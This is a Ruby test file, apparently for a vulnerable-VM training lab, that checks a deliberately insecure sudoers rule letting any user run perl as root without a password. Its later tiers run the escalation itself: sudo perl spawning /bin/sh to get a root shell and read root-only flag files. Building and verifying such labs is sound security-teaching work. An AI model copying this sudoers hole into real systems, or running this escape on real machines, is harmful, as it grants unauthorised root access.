require_relative '../../../../../lib/post_provision_test'


class SudoRootPerlTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_perl'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # read_facts: strings_to_leak and leaked_filenames. Both are checked below
    # (flag files in /root, and their contents read back as root in tier 2).
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_perl", 'root:root 440')
      test_local_command('sudoers rule allows perl as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_perl', 'ALL  ALL=(root) NOPASSWD: /bin/perl *, /usr/bin/perl *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('visudo accepts the sudoers configuration', 'visudo -c 2>&1; echo rc=$?', 'rc=0')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      test_local_command('unprivileged user can list the perl sudo rule', 'sudo -n -l', '/usr/bin/perl *', user: 'nobody')
      cmd = %q{sudo -n /usr/bin/perl -e 'system("id")'}
      test_local_command('unprivileged user runs perl as root via sudo', cmd, 'uid=0(root)', user: 'nobody')
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        read_cmd = %Q{sudo -n /usr/bin/perl -e 'system("cat #{Shellwords.escape("/root/#{fname}")}")'}
        test_local_command("unprivileged user reads leaked #{fname} via perl sudo", read_cmd, s.strip.lines.first.to_s.strip, user: 'nobody')
      end
    end
    # Tier 3: a real unprivileged login account escalates to root through the
    # GTFOBins `perl` sudo technique (sudo perl -e 'exec "/bin/sh";') and reads the
    # root-only flag. A throwaway SSH account, created and removed by the test,
    # stands in for a student's low-privilege shell — more faithful than `nobody`,
    # and the image ships no extra login. There is no Metasploit module for this
    # local sudo misconfiguration, so the proof is hand-written. <privilege>=root_rwx:
    # we assert the spawned shell runs as uid=0 (root), not just that the flag was read.
    tier(3) do
      fname = leaked.first
      skip!('module leaked no flag file to read') unless fname
      flag_line = strings.first.to_s.strip.lines.first.to_s.strip
      flag_path = "/root/#{fname}"
      with_throwaway_ssh_user do |user, _pass|
        # perl's exec() spawns /bin/sh under sudo; drive that root shell with -c to
        # run `id` and read the flag in one non-interactive shot.
        payload = %Q{sudo -n /usr/bin/perl -e 'exec "/bin/sh", "-c", "id; cat #{Shellwords.escape(flag_path)}";'}
        r = run_as_user(user, payload)
        out = "#{r[:stdout]}#{r[:stderr]}"
        got_root = out =~ /uid=0\(root\)/
        got_flag = flag_line.empty? || out.include?(flag_line)
        name = "throwaway user #{user} escalates to root via perl sudo and reads #{fname}"
        if got_root && got_flag
          pass_check(name, "GTFOBins perl/sudo gave a uid=0 shell that read #{flag_path} — <privilege>=root_rwx verified", tier: 3)
        else
          fail_check(name,
                     "perl/sudo escalation failed: root shell #{got_root ? 'obtained' : 'NOT obtained'}, flag #{got_flag ? 'read' : 'NOT read'}",
                     tier: 3,
                     evidence: "$ #{payload} (as #{user})\n--- stdout\n#{r[:stdout]}\n--- stderr\n#{r[:stderr]}")
        end
      end
    end
  end

end

SudoRootPerlTest.new.run
